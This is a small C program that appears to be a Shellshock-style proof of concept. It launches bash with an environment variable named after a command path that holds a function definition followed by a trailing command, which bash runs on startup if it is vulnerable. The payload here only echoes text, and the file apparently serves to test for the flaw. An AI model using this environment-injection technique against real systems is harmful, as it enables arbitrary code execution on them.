#include <unistd.h>
#include <stdio.h>

int main()
{
    char *envp[] = {
        "PATH=/bin:/usr/bin",
        "/usr/bin/id=() { "
            "echo pwn me twice, shame on me; }; "
            "echo pwn me once, shame on you",
        NULL
    };
    char *argv[] = { "/bin/bash", NULL };

    execve(argv[0], argv, envp);
    perror("execve");
    return 1;
}